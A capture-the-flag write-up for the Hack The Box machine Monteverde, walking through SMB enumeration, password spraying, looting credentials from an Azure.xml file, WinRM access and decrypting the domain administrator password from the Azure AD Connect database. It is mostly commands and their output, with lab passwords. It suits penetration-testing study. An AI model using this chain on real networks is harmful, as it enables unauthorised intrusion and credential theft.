
# HTB Monteverde – Writeup (OSCP Style)

## 📌 Overview

* Target: Monteverde
* Difficulty: Easy / Medium (AD)
* Key Concepts:

  * SMB Enumeration
  * Password Spraying
  * Credential Hunting
  * Azure AD Connect Abuse
  * Encrypted Credential Decryption

---

## 🔎 1. Enumeration

### Nmap Scan

```bash
nmap -sC -sV -p- <IP>
```

Key services identified:

* SMB (445)
* WinRM (5985)
* Domain: `MEGABANK.LOCAL`

---

## 📂 2. SMB Enumeration

Attempt anonymous access:

```bash
netexec smb <IP> -u '' -p '' --shares
```

Enumerate users via RID brute force:

```bash
netexec smb <IP> -u '' -p '' --rid-brute
```

A list of domain users is obtained.

---

## 🔑 3. Password Spraying

Try common weak passwords and username reuse:

```bash
netexec smb <IP> -u users.txt -p users.txt --no-bruteforce
```

Valid credentials found:

```text
SABatchJobs : SABatchJobs
```

---

## 📁 4. SMB Share Access

List available shares:

```bash
smbclient -L //<IP> -U SABatchJobs
```

Access `users$` share:

```bash
smbclient //<IP>/users$ -U SABatchJobs
```

Navigate to user directories:

```bash
cd mhope
ls
```

Inside `.azure` directory:

```bash
cd .azure
get Azure.xml
```

---

## 🔓 5. Credential Extraction

The XML file contains credentials:

```text
mhope : 4n0therD4y@n0th3r$
```

---

## 💻 6. WinRM Access

Login using Evil-WinRM:

```bash
evil-winrm -i <IP> -u mhope -p '4n0therD4y@n0th3r$'
```

---

## ⚙️ 7. Privilege Escalation (Azure AD Connect)

Check for Azure AD Connect installation:

```powershell
dir "C:\Program Files"
```

Found:

```text
Microsoft Azure AD Sync
```

---

## 🧠 8. Extract Credentials from ADSync Database

Upload the Azure AD Connect script:

```bash
upload Azure-ADConnect.ps1
```

Import the script:

```powershell
. .\Azure-ADConnect.ps1
```

Execute the function:

```powershell
Azure-ADConnect -server localhost -db ADSync
```

---

## 💀 9. Decryption Result

The script decrypts stored credentials:

```text
Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

---

## 👑 10. Administrator Access

Login as Administrator:

```bash
evil-winrm -i <IP> -u administrator -p 'd0m@in4dminyeah!'
```

---

## 🏁 11. Flags

User flag:

```powershell
type C:\Users\mhope\Desktop\user.txt
```

Root flag:

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## 🧠 Key Takeaways

* SMB shares often contain sensitive data
* Password reuse is extremely common
* User home directories are high-value targets
* Azure AD Connect stores encrypted credentials
* Encrypted credentials can be decrypted locally using system DLLs

---

## 💀 Attack Chain Summary

```text
SMB Enum →
Password Spray →
SABatchJobs →
users$ share →
Azure.xml →
mhope creds →
WinRM →
Azure AD Connect →
Decrypt →
Administrator
```
